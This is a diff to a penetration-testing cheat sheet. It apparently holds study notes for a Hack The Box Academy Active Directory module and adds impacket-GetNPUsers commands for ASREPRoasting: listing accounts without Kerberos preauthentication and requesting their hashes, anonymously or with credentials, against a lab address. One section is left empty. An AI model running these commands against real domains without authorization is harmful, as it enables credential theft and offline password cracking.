@@ -66,10 +66,32 @@ ASREPROASTING:
 
 ASREPRoasting refers to a technique that we obtain session key for accounts that is marked "DONT_REQ_PREAUTH" in its AD Attribute, when queried that result in the KDC returns a AS-REP message containing a session key encrypted with that user's password hash
 
-ASREPRoasting by impacket-getuserspn:
+ASREPRoasting by impacket-GetNPUsers:
+
+Anonymous Bind:
+Show all Roastable users 
 ```
-impacket-getuserspns -dc-ip <dcip> <domainname>/<username> -request -outputfile <outputfilename>
+impacket-GetNPUsers <domain name>/ -dc-ip <dcip>
+Example: impacket-GetNPUsers htb.local/ -dc-ip 10.129.63.149 
 ```
+
+Grab all Roastable Ticket:
+```
+impacket-GetNPUsers <domain name>/ -dc-ip <dcip> -request
+Example: impacket-GetNPUsers htb.local/ -dc-ip 10.129.63.149 -request
+```
+
+Grab Specific User Ticket:
+```
+
+```
+With Credential:
+Show all Roastable users with credential:
+```
+impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <DC_IP_address> 
+```
+
+
 
 
 Ref: https://academy.hackthebox.com/app/module/143/section/1423 / https://academy.hackthebox.com/app/module/143/section/1274
